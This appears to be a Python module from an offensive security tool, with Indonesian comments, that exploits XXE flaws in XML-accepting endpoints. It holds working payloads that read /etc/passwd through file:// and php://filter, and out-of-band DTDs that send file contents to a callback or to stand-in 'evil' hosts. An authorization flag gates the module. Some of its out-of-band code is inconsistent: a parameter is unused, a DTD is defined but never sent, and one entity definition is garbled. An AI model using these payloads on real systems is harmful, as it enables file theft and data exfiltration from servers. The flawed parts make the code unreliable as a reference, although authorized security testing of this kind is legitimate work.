"""XXE exploitation: injeksi entitas eksternal ke payload XML.

Mendeteksi & mengeksploitasi XML External Entity:
- classic: baca file sistem via SYSTEM file://
- OOB/blind: eksfiltrasi via entity eksternal yang memuat URL callback
  (butuh `callback_url` milik user: interactsh / listener Keris)
- parameter entity + error-based (MSSQL / libxml verbosity)

Selalu mengarahkan bukti ke konten file SISTEM yang stabil (/etc/passwd).

GUARD: memerlukan `authorized=True`; tanpa itu modul menolak beroperasi.
Gunakan HANYA pada target dengan izin tertulis.
"""

import re
from typing import List, Optional
from urllib.parse import urljoin

from keris.core.http import KerisHTTP
from keris.core.logger import debug, info, ok, warn
from keris.modules.scanner import Finding

PROOF_MARKERS = ["root:x:", "daemon:x:", "Microsoft Windows", "[fonts]"]

XXE_BODY = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
"""

XXE_PHP_BODY = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root><data>&xxe;</data></root>
"""

# parameter entity untuk exfil OOB
def _oob_body(callback_url: str, payload_file: str = "http://evil/file.dtd") -> str:
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "{callback_url}/xxe.dtd">
  %ext;
]>
<root><data>&send;</data></root>
"""

OOB_DTD = """<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '%s/?f=%file;'>">
%eval;
<!ENTITY % send "<!ENTITY &#x25; exfil2 SYSTEM 'http://%s/?f=%file;'>">
"""

EXTERNAL_DTD_BODY = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://HOST/evil.dtd">
  %ext;
  %send;
]>
<root>keris-xxe-probe</root>
"""

XML_MIME = {"Content-Type": "application/xml"}


def _has_proof(body: str) -> bool:
    low = body.lower()
    return any(m.lower() in low for m in PROOF_MARKERS)


def _endpoint_url(base: str, ep: str) -> str:
    if ep.startswith("http"):
        return ep
    return urljoin(base.rstrip("/") + "/", ep.lstrip("/"))


def test_xxe(base: str, client: KerisHTTP,
             endpoints: Optional[List[str]] = None,
             callback_url: Optional[str] = None,
             authorized: bool = False) -> List[Finding]:
    """Uji XXE pada endpoint yang menerima XML."""
    if not authorized:
        warn("XXE exploit memerlukan --authorized.")
        return []
    findings: List[Finding] = []
    targets = endpoints or ["/api/xml", "/api/parse", "/xml", "/api/import", "/rpc"]
    payloads = [XXE_BODY, XXE_PHP_BODY]
    for ep in targets:
        full = _endpoint_url(base, ep)
        for body in payloads:
            try:
                r = client.post(full, data=body.encode(), headers=XML_MIME, timeout=15)
            except Exception:
                continue
            text = r.text or ""
            if _has_proof(text):
                findings.append(Finding(
                    "CRITICAL", "XXE (read file sistem) terkonfirmasi",
                    full,
                    "Server memproses external entity & merefleksikan isi "
                    "/etc/passwd. File internal dapat dibaca.",
                    text[:300],
                    cwe="CWE-611",
                    references="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                ))
                ok(f"  XXE inline: {full}")
                return findings
            # wrapper php (base64)
            if len(text) > 40 and re.fullmatch(r"[A-Za-z0-9+/=\s]+", text or ""):
                import base64
                try:
                    dec = base64.b64decode("".join(text.split()) + "===").decode("utf-8", "ignore")
                    if _has_proof(dec):
                        findings.append(Finding(
                            "CRITICAL", "XXE via PHP wrapper (base64)",
                            full,
                            "External entity mengeksekusi php://filter dan isi "
                            "file terekstrak via base64.",
                            dec[:300],
                            cwe="CWE-611",
                        ))
                        return findings
                except Exception:
                    pass
        # blind OOB bila callback disediakan
        if callback_url:
            body = _oob_body(callback_url)
            try:
                client.post(full, data=body.encode(), headers=XML_MIME, timeout=12)
                # konfirmasi terjadi di listener milik user; tandai kandidat
                findings.append(Finding(
                    "HIGH", "XXE blind kandidat (cek callback listener)",
                    full,
                    f"Payload entity eksternal dikirim; bila callback "
                    f"`{callback_url}` menerima request, XXE OOB terkonfirmasi.",
                    f"callback={callback_url}",
                    cwe="CWE-611",
                ))
            except Exception:
                continue
    return findings
